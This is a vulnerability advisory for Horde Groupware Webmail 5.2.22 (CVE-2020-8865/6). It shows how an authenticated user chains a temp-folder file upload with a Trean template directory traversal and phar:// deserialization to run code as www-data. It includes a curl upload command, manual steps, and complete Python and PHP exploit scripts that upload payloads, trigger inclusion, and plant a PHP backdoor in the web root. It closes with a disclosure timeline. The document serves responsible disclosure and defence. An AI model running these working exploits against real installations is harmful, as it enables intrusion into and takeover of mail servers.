---
title: '[CVE-2020-8865/6] Horde Groupware Webmail Edition 5.2.22 — Multiple vulnerabilities promote file upload in temp folder to RCE'
description: The fix for CVE-2019-9858 (arbitrary file upload vulnerability) simply restricts the target directory to the temp folder. This, in combination with other vulnerabilities, allows an authenticated regular user to execute PHP and shell code as the user that runs the web server.
tags: [CVE, Horde, Multiple, upload, RCE]
advisory:
  discovered: 2019-06-19
  product: '[Horde Groupware Webmail Edition](https://www.horde.org/apps/webmail)'
  versions:
    - 2.0.19 ([Horde Form API](https://github.com/horde/Form))
    - 2.1.7 ([Horde HTTP libraries](https://github.com/horde/Http))
    - 1.1.9 ([Trean](https://github.com/horde/trean))
  cve:
    - CVE-2020-8865
    - CVE-2020-8866
---

## Abstract

The [fix][] for [CVE-2019-9858][] (arbitrary file upload vulnerability) in the [Form](https://github.com/horde/Form) component simply restricts the target directory to the temp folder. This, in combination with other vulnerabilities, allows an authenticated regular user to execute PHP code as the user that runs the web server, usually `www-data`.

Since this vulnerability does not concern IMP (the Horde webmail application) it is likely that also regular Horde Groupware (non-webmail edition) installations are affected.

[fix]: https://github.com/horde/Form/commit/f5fc41e9d3f1a7bc9371dda5d39ea7629b0030f3

[CVE-2019-9858]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9858

## Details

The fix (introduced in version 2.0.19) merely uses `basename` to discard any leading directory components:

```php
$tmp_file = Horde::getTempDir() . '/' . basename($upload['img']['file']);
// ...
move_uploaded_file($this->_img['img']['file'], $tmp_file);
```

This means that arbitrary files (name, extension and content) can be uploaded to the temp (e.g., `/tmp`) directory. This enables (at least) two RCE vulnerabilities:

- by uploading a `.inc` file it is possible to exploit a directory traversal vulnerability present in the [Trean](https://github.com/horde/trean) application and issue a PHP `require` against the uploaded file;

- by uploading a `.phar`[^phar-extension] file it is possible to exploit the lack of check on the URL scheme present in the [Http](https://github.com/horde/Http) library to call `fopen` with the `phar://` scheme and load the specially crafted PHAR file that in turn exploits the destructor of the `Horde_Auth_Passwd` class to invoke a PHP `rename` with controlled arguments thus lifting the above `basename` restriction introduced by the fix and allowing, for example, to plant a PHP backdoor.

Exploiting all this manually can be hard and cumbersome, in the "Exploits" section several scripts are provided to automatize all the needed steps. Follows a detailed description of the single phases of this attack.

[^phar-extension]: Apparently it is not strictly needed to use the `.phar` extension, *any* non-empty extension will cause PHP to treat the file as PHAR if accessed via the `phar://` scheme.

### File upload

Arbitrary file upload in the temp folder can be achieved like follows:

```console
$ curl http://target.com/turba/add.php \
    -F 'object[photo][img][file]=file.ext' \
    -F 'object[photo][new]=@/path/to/some/file' \
    -b 'Horde=COOKIE_HERE' \
    -A 'USER_AGENT_HERE'
```

This places the content of the local file `/path/to/some/file'` to `/tmp/file.ext`.

Note that Horde checks that the user agent is the same as the request that performed the login.

### PHP file inclusion

The Trean application provides two[^three-blocks] blocks (widgets, that users can place in their home screen): `lib/Block/Bookmarks.php` and `lib/Block/Mostclicked.php`. They use a template file to render the bookmarks:

```php
$template = TREAN_TEMPLATES . '/block/' . $this->_params['template'] . '.inc';
// ...
require $template;
```

Since `$this->_params['template']` is controlled by the user (by setting the block preferences), directory traversal can be used to include an arbitrary file in `/tmp`.

The manual steps to achieve the above are:

1. upload a `/tmp/exploit.inc` file as previously discussed, for example:

   ```php
   <?php passthru("id"); die();
   ```

2. make sure to have at least one bookmark (from the top menu click "Others" -> "Bookmarks", then "New Bookmark");

3. from the home page click the "Add Content" button;

4. select either "Bookmarks: Bookmarks" or "Bookmarks: Most-clicked Bookmarks" and click "Add";

5. edit field labeled by "Template" to target the uploaded file, i.e., `../../../../../../../../../../../tmp/exploit` and click "Save"[^manual];

6. navigate back to the home to trigger the vulnerability.

[^three-blocks]: Actually the Git version comes with a third apparently vulnerable block (`Tagsearch.php`) but it is missing in the PEAR and Debian APT versions.

[^manual]: This cannot be done directly from the web page, either intercept the request or use the developer tools of the browser to change the value.

### PHAR loading

The Http library uses `fopen` to fetch the remote page and due to lack of checks on the URL, arbitrary schemes can be used. In particular, by using the `phar://` scheme to load a specially crafted PHAR file it is possible to attempt to implement a well-known PHP unserialization technique[^phar-unserialization].

In order for this to work there must exist PHP classes that do something *exploitable* in their `__destruct` or `__wakeup` methods. The `Horde_Auth_Passwd` (located in the `lib/Horde/Auth/Passwd.php` file of the [`Auth`](https://github.com/horde/Auth) repository) seems a good candidate:

```php
public function __destruct()
{
    if ($this->_locked) {
        foreach ($this->_users as $user => $pass) {
            $data = $user . ':' . $pass;
            if ($this->_users[$user]) {
                $data .= ':' . $this->_users[$user];
            }
            fputs($this->_fplock, $data . "\n");
        }
        rename($this->_lockfile, $this->_params['filename']);
        flock($this->_fplock, LOCK_UN);
        $this->_locked = false;
        fclose($this->_fplock);
    }
}
```

The above `rename` can be called with arbitrary parameters since they both depends on `$this`, the only requirement is that `$this->_locked` is set to a *truthy* value.

This can be used to eventually write arbitrary files anywhere in the filesystem, provided that `www-data` has the permission to do so. For example, in a typical Horde installation the `static` folder in the WWW root is usually writable by `www-data` so it is a good place to plant a PHP backdoor.

The Http library is used in several contexts, e.g., to fetch a bookmarked page in order to obtain the favicon, to load an external RSS feed, etc.

To use the latter, the manual steps are:

1. create the PHAR file locally (see the "Exploits" section);

2. upload it to `/tmp/exploit.phar` as previously discussed;

3. from the home page click the "Add Content" button;

4. select "Horde: Syndicated Feed" and click "Add";

5. edit field labeled by "Feed Address" to target the uploaded file, i.e., `phar:///tmp/exploit.phar` and click "Save";

6. navigate back to the home to trigger the vulnerability.

To use the other approach instead, just bookmark `phar:///tmp/exploit.phar` then click on it after the upload phase.

`Horde_Auth_Passwd` may not be the only exploitable case, there are several other classes that perform complex tasks in the destructor; yet this is not the part to be fixed.

[^phar-unserialization]: See [File Operation Induced Unserialization via the "phar://" Stream Wrapper](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).

## Exploits

Both exploits need a common Python class that wraps the interaction with Horde:

```python
import re
import requests

class Horde():
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.session()
        self.token = None
        self._login()

    def _login(self):
        url = '{}/login.php'.format(self.base_url)
        data = {
            'login_post': 1,
            'horde_user': self.username,
            'horde_pass': self.password
        }
        response = self.session.post(url, data=data)
        token_match = re.search(r'"TOKEN":"([^"]+)"', response.text)
        assert (
            len(response.history) == 1 and
            response.history[0].status_code == 302 and
            response.history[0].headers['location'] == '/services/portal/' and
            token_match
        ), 'Cannot log in'
        self.token = token_match.group(1)

    def upload_to_tmp(self, filename, data):
        url = '{}/turba/add.php'.format(self.base_url)
        files = {
            'object[photo][img][file]': (None, filename),
            'object[photo][new]': ('x', data)
        }
        response = self.session.post(url, files=files)
        assert response.status_code == 200, 'Cannot upload the file to tmp'

    def include_remote_inc_file(self, path):
        # vulnerable block (alternatively 'trean:trean_Block_Mostclicked')
        app = 'trean:trean_Block_Bookmarks'

        # add one dummy bookmark (to be sure)
        url = '{}/trean/add.php'.format(self.base_url)
        data = {
            'actionID': 'add_bookmark',
            'url': 'x'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the bookmark'

        # add bookmark block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save-resume',
            'app': app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the bookmark block'

        # edit bookmark block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save',
            'app': app,
            'params[template]': '../../../../../../../../../../../' + path
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot edit the bookmark block'

        # evaluate the remote file
        url = '{}/services/portal/'.format(self.base_url)
        response = self.session.get(url)
        print(response.text)

        # remove the bookmark block so to not break the page
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            # XXX token not needed here
            'row': 0,
            'col': 0,
            'action': 'removeBlock'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot reset the bookmark block'

    def trigger_phar(self, path):
        # vulnerable block (alternatively the same can be obtained by creating a
        # bookmark with the PHAR path and clocking on it)
        app = 'horde:horde_Block_Feed'

        # add syndicated feed block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save-resume',
            'app': app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the syndicated feed block'

        # edit syndicated feed block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save',
            'app': app,
            'params[uri]': 'phar://{}'.format(path)
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot edit the syndicated feed block'

        # load the PHAR archive
        url = '{}/services/portal/'.format(self.base_url)
        response = self.session.get(url)

        # remove the syndicated feed block so to not break the page
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            # XXX token not needed here
            'row': 0,
            'col': 0,
            'action': 'removeBlock'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot reset the syndicated feed block'
```
{: download="horde.py"}

### PHP file inclusion

The following script takes care of uploading and evaluating a `.inc` file.

```python
#!/usr/bin/env python3
from horde import Horde
import subprocess
import sys

TEMP_DIR = '/tmp'

if len(sys.argv) < 5:
    print('Usage: <base_url> <username> <password> <filename> <php_code>')
    sys.exit(1)

base_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
php_code = sys.argv[5]

# log into the web application
horde = Horde(base_url, username, password)

# upload (delete manually) and evaluate the .inc file
horde.upload_to_tmp('{}.inc'.format(filename), '<?php {} die();'.format(php_code))
horde.include_remote_inc_file('{}/{}'.format(TEMP_DIR, filename))
```
{: download="exploit-inc-inclusion.py"}

Use it as:

```console
$ python3 exploit-inc-inclusion.py http://target.com username password exploit 'passthru("id");'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Please note that the `/tmp/exploit.inc` file needs to be manually deleted.

### PHAR loading

The following PHP file is used to create the PHAR:

```php
#!/usr/bin/env php
<?php

// the __destruct method of Horde_Auth_Passwd eventually calls
// rename($this->_lockfile, $this->_params['filename']) if $this->_locked
class Horde_Auth_Passwd {
    // visibility must match since protected members are prefixed by "\x00*\x00"
    protected $_locked;
    protected $_params;

    function __construct($source, $destination) {
        $this->_params = array('filename' => $destination);
        $this->_locked = true;
        $this->_lockfile = $source;
    }
};

function createPhar($path, $source, $destination, $stub) {
    // create the object and specify source and destination files
    $object = new Horde_Auth_Passwd($source, $destination);

    // create the PHAR
    $phar = new Phar($path);
    $phar->startBuffering();
    $phar->addFromString('x', '');
    $phar->setStub("<?php $stub __HALT_COMPILER();");
    $phar->setMetadata($object);
    $phar->stopBuffering();
}

function main() {
    global $argc, $argv;

    // check arguments
    if ($argc != 5) {
        fwrite(STDERR, "Usage: <path> <source> <destination> <stub>\n");
        exit(1);
    }

    // create a fresh new phar
    $path = $argv[1];
    $source = $argv[2];
    $destination = $argv[3];
    $stub = $argv[4];
    @unlink($path);
    createPhar($path, $source, $destination, $stub);
}

main();
```
{: download="create-renaming-phar.php"}

Note how a fake `Horde_Auth_Passwd` class is used, yet the visibility of members must match the original since protected members are prefixed by `\x00*\x00` when serialized.

Also, PHARs support a leading PHP *stub* that can be used to run some bootstrap operations when the file is used as a standalone executable. This means that a PHAR file is also a valid PHP file, in fact the actual payload is placed in the stub and the `rename` is used to move the PHAR file into the WWW root.

The following Python script takes care of creating, uploading and triggering the PHAR file:

```python
#!/usr/bin/env python3
from horde import Horde
import requests
import subprocess
import sys

TEMP_DIR = '/tmp'
WWW_ROOT = '/var/www/html'

if len(sys.argv) < 5:
    print('Usage: <base_url> <username> <password> <filename> <php_code>')
    sys.exit(1)

base_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
php_code = sys.argv[5]

source = '{}/{}.phar'.format(TEMP_DIR, filename)
destination = '{}/static/{}.php'.format(WWW_ROOT, filename) # destination (delete manually)
temp = 'temp.phar'
url = '{}/static/{}.php'.format(base_url, filename)

# log into the web application
horde = Horde(base_url, username, password)

# create a PHAR that performs a rename when loaded and runs the payload when executed
subprocess.run([
    'php', 'create-renaming-phar.php',
    temp, source, destination, php_code
], stderr=subprocess.DEVNULL)

# upload the PHAR
with open(temp, 'rb') as fs:
    phar_data = fs.read()
    horde.upload_to_tmp('{}.phar'.format(filename), phar_data)

# load the phar thus triggering the rename
horde.trigger_phar(source)

# issue a request to trigger the payload
response = requests.get(url)
print(response.text)
```
{: download="exploit-phar-loading.py"}

Use it as:

```console
$ python3 exploit-phar-loading.py http://target.com username password exploit 'passthru("id");'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Just make sure to have the [`phar.readonly`][] setting disabled in the CLI version of the `php.ini` file on the attacker machine.

Please note that the `/var/www/html/static/exploit.php` file needs to be manually deleted.

[`phar.readonly`]: http://php.net/phar.readonly

## Timeline

2020-01-10
: First contact and disclosure with Zero Day Initiative (ZDI).

2020-03-04
: ZDI grants the reward.

2020-03-01
: Horde development team fixes ([Trean](https://github.com/horde/trean/commit/8844968890ac57fd0457d902bae302c85b22d566) and [Form](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6)).

2020-03-10
: ZDI publishes the advisories ([Trean](https://www.zerodayinitiative.com/advisories/ZDI-20-276/) and [Form](https://www.zerodayinitiative.com/advisories/ZDI-20-275/)).
